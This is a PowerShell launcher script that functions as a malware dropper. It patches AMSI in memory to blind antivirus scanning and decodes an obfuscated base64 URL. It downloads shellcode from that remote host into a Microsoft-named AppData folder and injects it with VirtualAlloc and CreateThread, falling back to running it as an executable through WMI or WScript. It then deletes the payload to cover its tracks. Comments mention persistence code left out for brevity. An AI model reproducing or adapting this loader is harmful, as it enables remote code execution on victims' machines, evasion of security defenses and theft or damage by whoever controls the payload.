$ErrorActionPreference = 'SilentlyContinue'
$logFile = "$env:TEMP\debug.log"
function Write-Log { param($msg) Add-Content -Path $logFile -Value "$(Get-Date -Format 'HH:mm:ss') - $msg" }

Write-Log "=== Launcher started ==="

# ========== AMSI BYPASS ==========
Write-Log "Applying AMSI bypass..."
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru

$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
if ($ptr -ne [IntPtr]::Zero) {
    $b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)
    Write-Log "AMSI bypass applied"
} else { Write-Log "AMSI bypass failed – cannot find AmsiScanBuffer" }

# ========== SELF-PRESERVATION (unchanged) ==========
# ... (keep your existing Save-ScriptToDisk and persistence code) ...
# (I'll omit for brevity, but keep it exactly as before)

# ========== DOWNLOAD SHELLCODE ==========
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
$shellcodeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
$shellcodePath = "$cache\payload.bin"
$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

Write-Log "Downloading shellcode from $shellcodeUrl"
if (-not (Test-Path $shellcodePath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile($shellcodeUrl, $shellcodePath)
        Write-Log "Download complete, file size: $((Get-Item $shellcodePath).Length) bytes"
    } catch { Write-Log "Download failed: $_" }
} else { Write-Log "Shellcode already exists" }

# Verify shellcode is not empty
if ((Test-Path $shellcodePath) -and (Get-Item $shellcodePath).Length -gt 0) {
    Write-Log "Shellcode file OK"
} else {
    Write-Log "Shellcode file missing or empty – aborting"
    exit
}

# ========== SHELLCODE INJECTION (with fallback) ==========
$injectionSuccess = $false

# Method 1: VirtualAlloc + VirtualProtect + CreateThread (current)
Write-Log "Attempting injection method 1..."
$kernel32 = Add-Type -memberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
[DllImport("kernel32.dll")]
public static extern uint GetLastError();
"@ -name "Kernel32" -namespace Win32 -passthru

$code = [System.IO.File]::ReadAllBytes($shellcodePath)
Write-Log "Shellcode length: $($code.Length) bytes"

$ptr = $kernel32::VirtualAlloc([IntPtr]::Zero, $code.Length, 0x3000, 0x04)  # PAGE_READWRITE
if ($ptr -ne [IntPtr]::Zero) {
    Write-Log "VirtualAlloc succeeded at $ptr"
    [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $ptr, $code.Length)
    $old = 0
    if ($kernel32::VirtualProtect($ptr, $code.Length, 0x20, [ref]$old)) {  # PAGE_EXECUTE_READ
        Write-Log "VirtualProtect succeeded"
        $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        if ($thread -ne [IntPtr]::Zero) {
            Write-Log "CreateThread succeeded – thread handle: $thread"
            $injectionSuccess = $true
            # Do not wait – let it run asynchronously
        } else { Write-Log "CreateThread failed, last error: $($kernel32::GetLastError())" }
    } else { Write-Log "VirtualProtect failed, last error: $($kernel32::GetLastError())" }
} else { Write-Log "VirtualAlloc failed, last error: $($kernel32::GetLastError())" }

# If injection failed, fallback to EXE execution (if the payload is actually an EXE)
if (-not $injectionSuccess) {
    Write-Log "Injection failed – trying fallback: execute as EXE"
    # Rename .bin to .exe and run
    $exePath = "$cache\helper.exe"
    Copy-Item -Path $shellcodePath -Destination $exePath -Force
    try {
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
        Write-Log "EXE fallback succeeded"
        $injectionSuccess = $true
    } catch {
        try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false); Write-Log "WScript fallback succeeded" } catch { Write-Log "All fallbacks failed" }
    }
}

# ========== CREATE FIRST-RUN FLAG ==========
$flagFile = "$cache\installed.flag"
if (-not (Test-Path $flagFile)) { New-Item -Path $flagFile -ItemType File -Force | Out-Null }

# ========== CLEANUP ==========
Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 300; Remove-Item $f -Force -ErrorAction SilentlyContinue } -ArgumentList $shellcodePath | Out-Null

Write-Log "Launcher finished. Injection success: $injectionSuccess"
